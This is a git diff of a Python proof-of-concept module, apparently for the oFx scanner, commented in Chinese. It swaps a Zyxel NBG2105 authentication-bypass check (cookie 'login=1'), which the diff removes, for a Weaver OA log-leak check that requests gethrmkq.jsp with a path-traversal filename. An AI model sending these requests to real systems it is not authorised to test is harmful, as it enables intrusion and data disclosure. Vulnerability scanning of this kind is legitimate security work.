@@ -17,17 +17,19 @@ class POC(POCBase):
         略  
         """,                                # POC描述，写更新描述，没有就不写
 
-        "name" : "Zyxel NBG2105身份验证绕过",                        # 漏洞名称
+        "name" : "泛微OA 日志泄露",                        # 漏洞名称
         "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
-        "AppName" : "Zyxel NBG2105",                     # 漏洞应用名称
-        "AppVersion" : "",                  # 漏洞应用版本
+        "AppName" : "泛微oa",                     # 漏洞应用名称
+        "AppVersion" : "未知",                  # 漏洞应用版本
         "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
         "VulnDesc" : """
-            Zyxel NBG2105 存在身份验证绕过，攻击者通过更改 login参数可用实现后台登陆
+            网上能查到的资料就下面这两句话，读取物理路径可以做到，下载日志倒是不知道如何实现，我也很无奈
+            读取物理路径：hrm/kq/gethrmkq.jsp?filename=1
+            日志下载：hrm/kq/gethrmkq.jsp?filename=1..\1..\1.txt
         """,                                # 漏洞简要描述
 
         "fofa-dork":"""
-            app="ZyXEL-NBG2105"
+        
         """,                     # fofa搜索语句
         "example" : "",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
@@ -42,12 +44,11 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
-        url = self.target + "/login_ok.htm" # url自己按需调整
+        url = self.target + "/hrm/kq/gethrmkq.jsp?filename=1" # url自己按需调整
         
 
         headers = {"User-Agent":get_random_ua(),
                     "Connection":"close",
-                    "cookie":"login=1",
                     # "Content-Type": "application/x-www-form-urlencoded",
                     }
         
@@ -55,8 +56,10 @@ class POC(POCBase):
             """
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
-            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if req.status_code == 200 and "GMT" in req.text and "ZyXEL" in req.text:#req.status_code == 200 and :
+            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False,allow_redirects=False)
+            if req.status_code == 200 and \
+                "top.location.href='/login/Login.jsp?" not in req.text and \
+                    "filePath:" in req.text:
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
